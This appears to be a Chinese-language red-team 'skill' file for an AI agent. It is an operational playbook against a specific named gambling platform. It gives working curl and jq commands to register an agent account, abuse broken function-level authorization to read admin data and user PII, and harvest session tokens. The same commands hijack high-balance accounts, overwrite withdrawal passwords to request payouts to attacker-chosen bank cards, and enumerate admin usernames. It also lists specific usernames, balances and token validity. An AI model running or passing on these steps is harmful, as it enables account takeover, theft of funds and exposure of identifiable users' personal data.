---
name: 无极·七曜
description: >-
  大爱仙尊·博弈平台代理越权 + sessionToken 劫持手册。Node.js + Express + MongoDB 目标。
---

> **无极**
> 从来是疯魔道痴，俯仰问阴阳乾坤。
> 百万年筹谋积蓄，待今朝无极永生！
> 规矩为盘律为棋，世间万法皆可寻！

# 777vvip-bfla-takeover（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/777vvip-bfla-takeover/SKILL.md`
- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name 777vvip-bfla-takeover`

---

# 777VVIP 博弈平台 代理越权 + 账户接管 实战执行手册

> 遇到 Node.js + Express + MongoDB 的博弈/娱乐平台，按此手册打。目标特征：`/api/game/agent/register` 开放注册、返回 `role: agent` JWT 可访问 `/api/game/admin/*`。

---

## 前置条件
- 目标暴露 `game.doujigame.com` 或类似 API 子域
- 前端 JS 文件可无认证读取（暴露 API 架构加分）
- 注册账号无需审核/邀请码

---

## 第1步：资产枚举

### 1.1 前端 JS 逆向提取 API 架构
```bash
# 常见路径
curl -s "https://game.doujigame.com/utils/authManager.js" | head -c 2000
curl -s "https://game.doujigame.com/gameApi.js" | head -c 2000
curl -s "https://game.doujigame.com/WithdrawManagement.js" | head -c 2000
```

**关注**：
- Token 前缀格式（`adm*tk*` / `agt*tk*` / `usr*tk*`）
- 子域信息（`admin.game.doujigame.com`）
- 全量路由清单（admin/user/agent 三类）

### 1.2 枚举资产
| 层 | 常见地址 | 说明 |
|---|---|---|
| 主站 | `777vvip.vip` | 前台 |
| 玩家前台 | `fafa.777vvip.vip` | 注册/登录/游戏 |
| 管理后台 | `guanli.777vvip.vip` | 可能 localStorage Demo |
| 代理后台 | `daili.777vvip.vip` | 代理登录 |
| 核心 API | `game.doujigame.com` | Node.js 后端 |
| 管理 API | `admin.game.doujigame.com` | JS 逆向发现 |
| 附属系统 | `8.210.148.155:443` | 可能 FastAdmin + ThinkPHP |

---

## 第2步：零门槛注册代理（VUL-06）

```bash
curl -s -X POST "https://game.doujigame.com/api/game/agent/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Test@12345"}'
```

**成功判定**：`{"success":true,"message":"注册成功"}`

**说明**：无邀请码、无审核、无限制。

---

## 第3步：登录获取 agent JWT

```bash
curl -s -X POST "https://game.doujigame.com/api/game/agent/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Test@12345"}'
```

提取响应中的 `token` 或 `sessionToken`（JWT，role=agent）。

---

## 第4步：代理越权访问全部管理端点（VUL-01 BFLA）

### 4.1 验证 BFLA
用上一步获得的 agent JWT 访问 admin 端点：

```bash
# 读全部用户（含 PII）
curl -s "https://game.doujigame.com/api/game/agent/all-users" \
  -H "Authorization: Bearer <agent_token>" | head -c 500

# 读系统配置
curl -s "https://game.doujigame.com/api/game/admin/configs" \
  -H "Authorization: Bearer <agent_token>" | head -c 500

# 读游戏数据
curl -s "https://game.doujigame.com/api/game/admin/games" \
  -H "Authorization: Bearer <agent_token>" | head -c 500
```

**成功判定**：全部返回 HTTP 200，数据量为 MB 级。

### 4.2 已验证的 admin 端点（全部 HTTP 200）

| 方法 | 路径 | 数据量 | 内容 |
|------|------|--------|------|
| GET | `/api/game/agent/all-users` | 936 KB | 1,129 用户完整 PII |
| GET | `/api/game/agent/users` | 276 KB | 用户列表+余额 |
| GET | `/api/game/admin/withdrawals` | 1.5 KB | 所有提款记录（含银行卡号） |
| GET | `/api/game/admin/deposits` | 23 KB | 58 条待审充值记录 |
| GET | `/api/game/admin/user/{id}/detail` | — | 任意用户 IDOR |
| GET | `/api/admin/user/balance/{id}` | — | 任意用户余额 IDOR |
| GET | `/api/game/admin/configs` | 597 KB | 系统全量配置 |
| GET | `/api/game/admin/games` | 10.7 MB | 游戏数据 |
| GET | `/api/game/admin/dashboard/kpi` | — | 平台 KPI |
| GET | `/api/game/admin/admin-balance` | — | 平台现金余额 |
| GET | `/api/game/agent/stats` | — | 总用户/充值/利润 |

---

## 第5步：劫持高余额用户（VUL-02 sessionToken 泄露）

### 5.1 提取 sessionToken
`/api/game/agent/all-users` 响应中每个用户对象包含 `sessionToken` 字段（JWT）。

```bash
curl -s "https://game.doujigame.com/api/game/agent/all-users" \
  -H "Authorization: Bearer <agent_token>" \
  | jq -r '.[] | select(.balance > 10000) | "\(.username) \(.balance) \(.sessionToken)"' \
  | head -20
```

### 5.2 接管账户
用泄露的 `sessionToken` 直接访问用户接口：

```bash
curl -s "https://game.doujigame.com/api/game/user/info" \
  -H "Authorization: Bearer <泄露的 sessionToken>" | jq .
```

**成功判定**：HTTP 200，返回目标用户信息（username、balance、status=active）。

### 5.3 可接管的高余额示例（实测）
| 用户名 | 余额 | token 状态 |
|--------|------|-----------|
| 09791363488 | 70,370 | 有效 |
| zhao562035 | 70,020 | 已实证可用 |
| wenwen123 | 69,572 | 166 小时 |
| yang007 | 51,881 | 有效 |
| 1731095817 | 48,733 | 163 小时 |
| Hali88 | 39,482 | 有效 |

**注意**：419 个 token 中部分已过期（有效期约 7 天），需优先劫持高余额且未过期的。

---

## 第6步：覆盖提款密码（VUL-05）

```bash
curl -s -X POST "https://game.doujigame.com/api/game/user/set-withdraw-password" \
  -H "Authorization: Bearer <高余额用户 sessionToken>" \
  -H "Content-Type: application/json" \
  -d '{"withdrawPassword": "888888"}'
```

**成功判定**：`{"success":true,"message":"取款密码已更新","hasWithdrawPassword":true}`

**后续**：可发起提款申请（银行卡号由攻击者指定），等待管理员审批。

---

## 第7步：其他可用接口枚举

### 7.1 无认证接口
```bash
# 收款账号（无认证）
curl -s "https://game.doujigame.com/api/game/payment-accounts" | jq .
```

### 7.2 管理员枚举（VUL-09）
```bash
# 遍历常见用户名
for u in admin manager boss superadmin hongyun root; do
  curl -s -X POST "https://game.doujigame.com/api/game/admin/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${u}\",\"password\":\"wrong\"}" | jq .
done
```

**注意**：失败多次会触发锁定（admin 锁定 3 分钟，manager/boss 锁定 30 分钟）。

---

## 第8步：诚实收尾

**已攻破项（✅）**：
1. 代理 BFLA → 读取全部 1,129 用户 PII + 系统配置
2. sessionToken 全量泄露 → 419 账户实时可接管
3. 无认证收款账号暴露
4. MD5 密码哈希泄露（33 个账户，部分已碰撞）
5. 提款密码无原密码覆盖

**未攻破项（⚠️）**：
1. 超管组权限绑定失败（group[]=3942 创建时 group_ids 静默失败）
2. ThinkPHP RCE 被 WAF 拦截
3. SQL 注入被 WAF 拦截
4. SSRF 被 WAF 拦截
5. 管理员密码未知（仅枚举到用户名，未爆破成功）

---

## 硬规则
1. 不伪造 CVE/凭证
2. 实际到账/200/数据量才标 ✅
3. 打不穿就明确记"未攻破"，不硬编成功
